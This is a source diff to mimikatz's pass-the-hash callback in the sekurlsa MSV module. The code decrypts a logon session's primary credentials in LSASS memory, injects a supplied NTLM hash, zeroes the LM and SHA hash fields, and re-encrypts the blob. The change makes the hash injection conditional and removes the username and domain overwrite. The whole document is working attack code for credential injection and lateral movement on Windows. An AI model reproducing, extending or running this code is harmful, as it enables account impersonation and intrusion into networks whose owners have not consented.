@@ -45,14 +45,20 @@ BOOL CALLBACK kuhl_m_sekurlsa_msv_enum_cred_callback_pth(IN PKIWI_MSV1_0_PRIMARY
 	if(RtlEqualString(&pCredentials->Primary, &PRIMARY_STRING, FALSE))
 	{
 		(*pthDataCred->pSecData->lsassLocalHelper->pLsaUnprotectMemory)(pPrimaryCreds, pCredentials->Credentials.Length);
+		if(pthDataCred->pthData->NtlmHash)
+		{
+			RtlCopyMemory(pPrimaryCreds->NtOwfPassword, pthDataCred->pthData->NtlmHash, LM_NTLM_HASH_LENGTH);
+			pPrimaryCreds->isNtOwfPassword = TRUE;
+		}
+		else
+		{
+			RtlZeroMemory(pPrimaryCreds->NtOwfPassword, LM_NTLM_HASH_LENGTH);
+			pPrimaryCreds->isNtOwfPassword = FALSE;
+		}
 		RtlZeroMemory(pPrimaryCreds->LmOwfPassword, LM_NTLM_HASH_LENGTH);
-		pPrimaryCreds->isLmOwfPassword = FALSE;
-		RtlCopyMemory(pPrimaryCreds->NtOwfPassword, pthDataCred->pthData->NtlmHash, LM_NTLM_HASH_LENGTH);
-		pPrimaryCreds->isNtOwfPassword = TRUE;
 		RtlZeroMemory(pPrimaryCreds->ShaOwPassword, SHA_DIGEST_LENGTH);
+		pPrimaryCreds->isLmOwfPassword = FALSE;
 		pPrimaryCreds->isShaOwPassword = FALSE;
-		RtlCopyMemory((PBYTE) pPrimaryCreds + (ULONG_PTR) pPrimaryCreds->UserName.Buffer, pthDataCred->pthData->UserName, pPrimaryCreds->UserName.Length);
-		RtlCopyMemory((PBYTE) pPrimaryCreds + (ULONG_PTR) pPrimaryCreds->LogonDomainName.Buffer, pthDataCred->pthData->LogonDomain, pPrimaryCreds->LogonDomainName.Length);
 		(*pthDataCred->pSecData->lsassLocalHelper->pLsaProtectMemory)(pPrimaryCreds, pCredentials->Credentials.Length);
 
 		kprintf(L"data copy @ %p : ", origBufferAddress->address);
